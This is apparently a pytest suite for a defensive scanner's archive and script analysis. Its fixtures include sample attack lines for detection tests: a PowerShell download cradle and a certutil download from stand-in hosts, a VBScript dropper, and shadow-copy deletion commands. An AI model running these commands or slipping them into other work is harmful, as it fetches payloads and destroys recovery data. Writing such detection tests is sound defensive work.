"""
Unit and Integration Tests for ACTIS Non-PE File Fallback Analysis Subsystem
Automated Cyber Threat Intelligence System — Month 2 Week 5 (Days 32–34)

Verifies:
1. Streaming cryptographic hashing correctness and chunk boundary behavior.
2. Safe archive recognition and metadata inspection (ZIP, TAR, GZ, 7z fallback).
3. Defensive limits: zero extraction to disk, zip bomb detection, corrupted archive resilience.
4. Static script heuristics (PowerShell, Batch, VBScript, Python) without code execution.
5. Comment filtering preventing false positives in benign documentation.
6. Seamless routing in FileFeatureExtractor, ThreatDetector, and RuleEngine.
"""

import gzip
import io
import os
import tarfile
import zipfile
from pathlib import Path
from unittest.mock import MagicMock

import pytest

from scanners.file_feature_extractor import FileFeatureExtractor, calculate_file_hashes
from scanners.file_scanner import scan_file
from scanners.non_pe_contract import (
    NonPEFileType,
    NonPEAnalysisMethod,
    NonPEAnalysisStatus,
    ArchiveMetadata,
    ScriptMetadata,
    NonPEAnalysisResult,
)
from scanners.non_pe_analyzer import (
    NonPEAnalyzer,
    MAX_ARCHIVE_FILE_SIZE_BYTES,
    MAX_COMPRESSION_RATIO,
)
from detection_engine.rule_engine import RuleEngine, RuleSeverity
from tests.test_static_pe import create_minimal_synthetic_pe


# =============================================================================
# 1. Streaming Cryptographic Hashing Tests
# =============================================================================

class TestStreamingCryptographicHashing:
    """Verifies memory-bounded streaming hashing on varied inputs and chunk boundaries."""

    def test_hashing_empty_file(self, tmp_path):
        empty_file = tmp_path / "empty.dat"
        empty_file.write_bytes(b"")
        hashes = calculate_file_hashes(empty_file)
        assert hashes["sha256"] == "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
        assert hashes["md5"] == "d41d8cd98f00b204e9800998ecf8427e"
        assert hashes["sha1"] == "da39a3ee5e6b4b0d3255bfef95601890afd80709"

    def test_hashing_chunk_boundaries(self, tmp_path):
        # Test exact buffer size (64KB), crossing boundary (64KB + 1 byte), and double (128KB)
        chunk_sizes = [65536, 65537, 131072]
        for sz in chunk_sizes:
            data = b"A" * sz
            test_file = tmp_path / f"boundary_{sz}.dat"
            test_file.write_bytes(data)

            hashes = calculate_file_hashes(test_file, chunk_size=65536)
            import hashlib
            expected_sha256 = hashlib.sha256(data).hexdigest()
            assert hashes["sha256"] == expected_sha256

    def test_hashing_determinism_and_content_isolation(self, tmp_path):
        f1 = tmp_path / "sample1.txt"
        f2 = tmp_path / "sample2.txt"
        content = b"ACTIS Deterministic Cryptographic Hashing Test Payload\n"
        f1.write_bytes(content)
        f2.write_bytes(content)

        h1 = calculate_file_hashes(f1)
        h2 = calculate_file_hashes(f2)
        assert h1 == h2

    def test_hashing_missing_and_invalid_inputs(self):
        with pytest.raises(FileNotFoundError):
            calculate_file_hashes("non_existent_file_path_12345.dat")
        with pytest.raises(FileNotFoundError):
            calculate_file_hashes(None)


# =============================================================================
# 2. Archive Recognition and Metadata Inspection Tests
# =============================================================================

class TestArchiveInspection:
    """Tests safe, read-only metadata inspection across supported archive formats."""

    def test_zip_benign_safe_inspection_no_extraction(self, tmp_path):
        zip_path = tmp_path / "benign.zip"
        with zipfile.ZipFile(zip_path, "w", compression=zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("readme.txt", "This is benign documentation.")
            zf.writestr("data/table.csv", "id,name,value\n1,alice,100\n")

        res = NonPEAnalyzer.analyze_non_pe_file(
            zip_path,
            hashes={"sha256": "dummy"},
            entropy=5.0,
            file_size=zip_path.stat().st_size
        )
        assert res.detected_format == NonPEFileType.ARCHIVE_ZIP
        assert res.analysis_method == NonPEAnalysisMethod.ARCHIVE_METADATA_INSPECTION
        assert res.analysis_status == NonPEAnalysisStatus.ANALYZED
        assert res.archive_metadata is not None
        assert res.archive_metadata.entry_count == 2
        assert res.archive_metadata.has_executable_entries is False
        assert res.archive_metadata.is_suspicious_bomb is False

    def test_zip_with_executable_content_flagged(self, tmp_path):
        zip_path = tmp_path / "payload.zip"
        with zipfile.ZipFile(zip_path, "w") as zf:
            zf.writestr("setup.exe", b"MZDummyExecutableBytes")
            zf.writestr("install.bat", b"@echo off\necho hello\n")

        features = FileFeatureExtractor.extract_features(zip_path)
        assert features["is_pe"] is False
        assert features["detected_format"] == "ARCHIVE_ZIP"

        eval_res = RuleEngine.evaluate_file(features)
        assert "RULE_ARCHIVE_EXECUTABLE_CONTENT" in eval_res["rules_triggered"]
        assert eval_res["score"] >= 20

    def test_zip_double_extension_camouflage_flagged(self, tmp_path):
        zip_path = tmp_path / "phish.zip"
        with zipfile.ZipFile(zip_path, "w") as zf:
            zf.writestr("invoice_2026.pdf.exe", b"MZPhishingExecutable")

        features = FileFeatureExtractor.extract_features(zip_path)
        eval_res = RuleEngine.evaluate_file(features)
        assert "RULE_ARCHIVE_DOUBLE_EXTENSION" in eval_res["rules_triggered"]
        assert eval_res["score"] >= 30

    def test_zip_bomb_compression_ratio_detection(self, tmp_path):
        # Synthetic mock metadata representing a decompression bomb with ratio > 100
        mock_meta = ArchiveMetadata(
            entry_count=10,
            total_uncompressed_size=500 * 1024 * 1024,
            compression_ratio=150.0,
            is_suspicious_bomb=True
        )
        info = {
            "is_pe": False,
            "filename": "bomb.zip",
            "non_pe_features": {"archive_metadata": mock_meta.to_dict()}
        }
        eval_res = RuleEngine.evaluate_file(info)
        assert "RULE_ARCHIVE_ZIP_BOMB" in eval_res["rules_triggered"]
        assert eval_res["score"] >= 45

    def test_tar_archive_safe_inspection(self, tmp_path):
        tar_path = tmp_path / "archive.tar"
        with tarfile.open(tar_path, "w") as tf:
            data = b"Hello from TAR"
            ti = tarfile.TarInfo(name="test.txt")
            ti.size = len(data)
            tf.addfile(ti, io.BytesIO(data))

        res = NonPEAnalyzer.analyze_non_pe_file(
            tar_path,
            hashes={"sha256": "dummy"},
            entropy=4.2,
            file_size=tar_path.stat().st_size
        )
        assert res.detected_format == NonPEFileType.ARCHIVE_TAR
        assert res.analysis_method == NonPEAnalysisMethod.ARCHIVE_METADATA_INSPECTION
        assert res.archive_metadata.entry_count == 1

    def test_gzip_archive_safe_inspection(self, tmp_path):
        gz_path = tmp_path / "data.csv.gz"
        with gzip.open(gz_path, "wb") as gz:
            gz.write(b"col1,col2,col3\nval1,val2,val3\n")

        res = NonPEAnalyzer.analyze_non_pe_file(
            gz_path,
            hashes={"sha256": "dummy"},
            entropy=4.5,
            file_size=gz_path.stat().st_size
        )
        assert res.detected_format == NonPEFileType.ARCHIVE_GZIP
        assert res.archive_metadata.entry_count == 1

    def test_7z_unsupported_graceful_fallback_no_crash(self, tmp_path):
        # 7z file with valid 7z header magic
        seven_z_path = tmp_path / "sample.7z"
        seven_z_path.write_bytes(b"7z\xbc\xaf\x27\x1c\x00\x01\x02\x03\x04")

        res = NonPEAnalyzer.analyze_non_pe_file(
            seven_z_path,
            hashes={"sha256": "dummy"},
            entropy=5.0,
            file_size=seven_z_path.stat().st_size
        )
        assert res.detected_format == NonPEFileType.ARCHIVE_7Z
        assert res.analysis_method == NonPEAnalysisMethod.FORMAT_UNSUPPORTED
        assert res.analysis_status == NonPEAnalysisStatus.UNSUPPORTED_FORMAT
        assert res.is_supported is False
        assert any("py7zr" in w for w in res.warnings)

    def test_corrupted_archive_handled_gracefully(self, tmp_path):
        corrupt_zip = tmp_path / "corrupt.zip"
        # Corrupt file claiming to be a zip
        corrupt_zip.write_bytes(b"PK\x03\x04CorruptJunkDataNotAValidZipFile1234567890")

        features = FileFeatureExtractor.extract_features(corrupt_zip)
        assert features["is_pe"] is False
        non_pe = features.get("non_pe_features", {})
        assert non_pe.get("analysis_status") == "PARSING_FAILED"
        assert any("corrupted" in w.lower() for w in features["warnings"])


# =============================================================================
# 3. Static Script Heuristics Tests
# =============================================================================

class TestStaticScriptHeuristics:
    """Verifies static script heuristics without dynamic code execution."""

    def test_powershell_download_and_execute_cradle(self, tmp_path):
        ps1_path = tmp_path / "dropper.ps1"
        ps1_path.write_text(
            'IEX (New-Object Net.WebClient).DownloadString("http://malicious-test.xyz/stage2.ps1")',
            encoding="utf-8"
        )

        features = FileFeatureExtractor.extract_features(ps1_path)
        assert features["is_pe"] is False
        assert features["detected_format"] == "SCRIPT_POWERSHELL"

        eval_res = RuleEngine.evaluate_file(features)
        assert "RULE_SCRIPT_POWERSHELL_DOWNLOAD_EXECUTE" in eval_res["rules_triggered"]
        assert eval_res["score"] >= 45

    def test_powershell_encoded_command(self, tmp_path):
        ps1_path = tmp_path / "encoded.ps1"
        ps1_path.write_text(
            'powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=',
            encoding="utf-8"
        )

        features = FileFeatureExtractor.extract_features(ps1_path)
        eval_res = RuleEngine.evaluate_file(features)
        assert "RULE_SCRIPT_POWERSHELL_ENCODED_COMMAND" in eval_res["rules_triggered"]
        assert eval_res["score"] >= 35

    def test_powershell_execution_bypass_and_hidden(self, tmp_path):
        ps1_path = tmp_path / "bypass.ps1"
        ps1_path.write_text(
            'powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File worker.ps1',
            encoding="utf-8"
        )

        features = FileFeatureExtractor.extract_features(ps1_path)
        eval_res = RuleEngine.evaluate_file(features)
        assert "RULE_SCRIPT_POWERSHELL_EXECUTION_BYPASS" in eval_res["rules_triggered"]
        assert eval_res["score"] >= 20

    def test_batch_certutil_download(self, tmp_path):
        bat_path = tmp_path / "get_payload.bat"
        bat_path.write_text(
            "@echo off\r\ncertutil.exe -urlcache -split -f http://evil.xyz/payload.exe %TEMP%\\payload.exe\r\n",
            encoding="utf-8"
        )

        features = FileFeatureExtractor.extract_features(bat_path)
        assert features["detected_format"] == "SCRIPT_BATCH"

        eval_res = RuleEngine.evaluate_file(features)
        assert "RULE_SCRIPT_BATCH_DOWNLOAD_EXECUTE" in eval_res["rules_triggered"]
        assert eval_res["score"] >= 30

    def test_batch_shadow_copy_deletion(self, tmp_path):
        bat_path = tmp_path / "ransom_setup.bat"
        bat_path.write_text(
            "@echo off\r\nvssadmin.exe delete shadows /all /quiet\r\nbcdedit /set {default} recoveryenabled no\r\n",
            encoding="utf-8"
        )

        features = FileFeatureExtractor.extract_features(bat_path)
        eval_res = RuleEngine.evaluate_file(features)
        assert "RULE_SCRIPT_SHADOW_COPY_DELETION" in eval_res["rules_triggered"]
        assert eval_res["score"] >= 45

    def test_vbscript_download_dropper(self, tmp_path):
        vbs_path = tmp_path / "dropper.vbs"
        vbs_path.write_text(
            'Set http = CreateObject("MSXML2.XMLHTTP")\r\n'
            'http.Open "GET", "http://test.xyz/stage.exe", False\r\n'
            'http.Send\r\n'
            'Set stream = CreateObject("ADODB.Stream")\r\n'
            'stream.Open\r\n'
            'stream.Write http.responseBody\r\n'
            'Set shell = CreateObject("WScript.Shell")\r\n'
            'shell.Run "stage.exe", 0\r\n',
            encoding="utf-8"
        )

        features = FileFeatureExtractor.extract_features(vbs_path)
        assert features["detected_format"] == "SCRIPT_VBSCRIPT"

        eval_res = RuleEngine.evaluate_file(features)
        assert "RULE_SCRIPT_VBSCRIPT_DOWNLOAD_DROPPER" in eval_res["rules_triggered"]
        assert eval_res["score"] >= 35

    def test_python_dynamic_execution_with_network_decode(self, tmp_path):
        py_path = tmp_path / "loader.py"
        py_path.write_text(
            'import base64\nexec(base64.b64decode("cHJpbnQoJ2hlbGxvJyk="))\n',
            encoding="utf-8"
        )

        features = FileFeatureExtractor.extract_features(py_path)
        assert features["detected_format"] == "SCRIPT_PYTHON"

        eval_res = RuleEngine.evaluate_file(features)
        assert "RULE_SCRIPT_PYTHON_DYNAMIC_EXECUTION" in eval_res["rules_triggered"]
        assert eval_res["score"] >= 30

    def test_benign_script_with_comments_not_flagged(self, tmp_path):
        # Documentation comments containing keywords must NOT trigger rules
        clean_ps1 = tmp_path / "admin_tools.ps1"
        clean_ps1.write_text(
            '# Note: do not use IEX or DownloadString in production scripts\n'
            '<#\n'
            'Example malicious pattern:\n'
            'vssadmin delete shadows\n'
            '#>\n'
            'Write-Output "Executing clean administrative task."\n',
            encoding="utf-8"
        )

        features = FileFeatureExtractor.extract_features(clean_ps1)
        eval_res = RuleEngine.evaluate_file(features)
        assert "RULE_SCRIPT_POWERSHELL_DOWNLOAD_EXECUTE" not in eval_res["rules_triggered"]
        assert "RULE_SCRIPT_SHADOW_COPY_DELETION" not in eval_res["rules_triggered"]
        assert eval_res["score"] == 0

    def test_clean_benign_python_script(self, tmp_path):
        clean_py = tmp_path / "calculator.py"
        clean_py.write_text(
            'def add(a: int, b: int) -> int:\n    return a + b\n\nif __name__ == "__main__":\n    print(add(2, 3))\n',
            encoding="utf-8"
        )

        features = FileFeatureExtractor.extract_features(clean_py)
        eval_res = RuleEngine.evaluate_file(features)
        assert eval_res["rules_triggered"] == []
        assert eval_res["score"] == 0


# =============================================================================
# 4. Pipeline Routing and Integration Tests
# =============================================================================

class TestNonPEPipelineIntegration:
    """Verifies that PE executables and non-PE files route properly through scan_file."""

    def test_pe_routing_preserves_pe_pipeline(self, tmp_path):
        pe_path = tmp_path / "test_pe.exe"
        pe_path.write_bytes(create_minimal_synthetic_pe())

        res = scan_file(pe_path)
        assert res["is_pe"] is True
        assert res["detected_format"] == "WINDOWS_PE"
        assert res["analysis_method"] == "STATIC_PE_PARSER"
        assert "sha256" in res
        assert len(res["sha256"]) == 64

    def test_non_pe_scan_file_integration_malicious_script(self, tmp_path):
        bad_script = tmp_path / "attack.bat"
        bad_script.write_text(
            "@echo off\r\nvssadmin delete shadows /all /quiet\r\nbcdedit /set recoveryenabled no\r\n",
            encoding="utf-8"
        )

        res = scan_file(bad_script)
        assert res["is_pe"] is False
        assert res["detected_format"] == "SCRIPT_BATCH"
        assert res["analysis_method"] == "SCRIPT_STATIC_HEURISTICS"
        assert res["score"] >= 35
        assert res["risk_level"] in ("MEDIUM", "HIGH", "CRITICAL")
        assert res["is_threat"] is True
        assert "RULE_SCRIPT_SHADOW_COPY_DELETION" in res["heuristic_result"]["rules_triggered"]
        assert any("Shadow Copies" in r for r in res["reasons"])

    def test_non_pe_scan_file_integration_benign_text(self, tmp_path):
        text_path = tmp_path / "notes.txt"
        text_path.write_text("Meeting notes from project standup.\nAll deliverables on schedule.\n", encoding="utf-8")

        res = scan_file(text_path)
        assert res["is_pe"] is False
        assert res["detected_format"] in ("GENERIC_TEXT", "UNKNOWN")
        assert res["score"] == 0
        assert res["risk_level"] == "LOW"
        assert res["is_threat"] is False
